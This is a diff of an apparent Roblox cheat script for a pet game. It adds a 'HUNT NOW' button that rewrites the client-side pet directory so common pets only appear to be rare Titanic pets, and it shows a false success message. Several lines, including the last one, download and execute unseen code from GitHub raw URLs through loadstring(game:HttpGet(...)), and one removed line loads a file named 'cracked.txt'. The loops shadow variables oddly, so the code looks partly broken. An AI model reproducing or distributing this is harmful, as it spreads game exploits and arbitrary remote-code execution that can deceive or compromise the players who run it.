@@ -1,2 +1,37 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Vital-Hub11/WolfHubb/main/wolfwolf.lua"))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Ichessfleischv2/Milk-Up/main/cracked.txt'))()
+local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
+local Window = Library:NewWindow("WOLFHUB EXCLUSIVE EGG")
+local Tab = Window:NewSection("TITANIC HUNTING")
+Tab:CreateButton("HUNT NOW", function()
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("HUNT SUCCESSFULLY")
+local lib = require(game.ReplicatedStorage.Library)
+
+   local fromPet = "Bejeweled Lion"
+local toPet = "Titanic Bejeweled Griffin"
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+local fromPet = "Cat"
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+end
+local fromPet = "Bejeweled Unicorn"
+local toPet = "Titanic Bejeweled Griffin"
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+local fromPet = "Cat"
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+end
+local fromPet = "Bejeweled Deer"
+local toPet = "Titanic Bejeweled Griffin"
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+local fromPet = "Cat"
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+end
+end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Ichessfleischv2/WolfHub/main/Luaexe3.txt'))()
